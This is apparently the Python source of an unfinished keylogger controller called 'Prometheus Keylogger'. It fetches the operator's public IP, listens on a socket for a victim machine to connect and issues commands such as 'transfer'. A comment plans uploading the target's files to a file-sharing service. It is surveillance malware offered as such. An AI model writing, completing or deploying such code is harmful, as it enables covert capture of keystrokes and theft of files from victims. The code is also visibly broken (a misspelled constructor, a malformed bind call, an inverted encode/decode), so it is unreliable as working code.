import socket
import threading
import requests
from pystyle import Colors


class OnlineKeylogger:
    def __int__(self, config):
        self.port = config["port"]
        self.ip = requests.get("https://checkip.amazonaws.com").text.strip()
        self._DEFAULT_SIZE = 1024
        self._ENCODING_FORMAT = "UTF-8"
        self.socket = socket.socket()

    def send(self, args, encode):
        return self.socket.send(bytes(args).decode(encode))

    def recv(self, size, encode):
        if encode is not None:
            receive = self.client.recv(size).decode(encode)
        else:
            receive = self.client.recv(size)

        return receive

    def connection_handle(self):
        logo = """                                                                                                                 
                  _____                          _   _                           _  ___      
                 |  __ \                        | | | |                         | |/ / |     
                 | |__) | __ ___  _ __ ___   ___| |_| |__   ___ _   _ ___       | ' /| |     
                 |  ___/ '__/ _ \| '_ ` _ \ / _ \ __| '_ \ / _ \ | | / __|      |  < | |     
                 | |   | | | (_) | | | | | |  __/ |_| | | |  __/ |_| \__ \      | . \| |____ 
                 |_|   |_|  \___/|_| |_| |_|\___|\__|_| |_|\___|\__,_|___/      |_|\_\______|
                                                                        
                                                  
                   """

        self.socket.bind("", self.port)
        self.socket.listen(1)
        (self.client, self.address) = self.socket.accept()
        while True:
            input_command = input(Colors.white + "[" + Colors.blue + "Prometheus Keylogger" + Colors.white + "]" + " > ")
            if input_command == "transfer":
                self.send(input_command, self._ENCODING_FORMAT)
                file_exists = self.recv(self._DEFAULT_SIZE, self._ENCODING_FORMAT)

            if input_command == "upload file":
                pass
                # to add an anonfile upload function and receive the link from the target
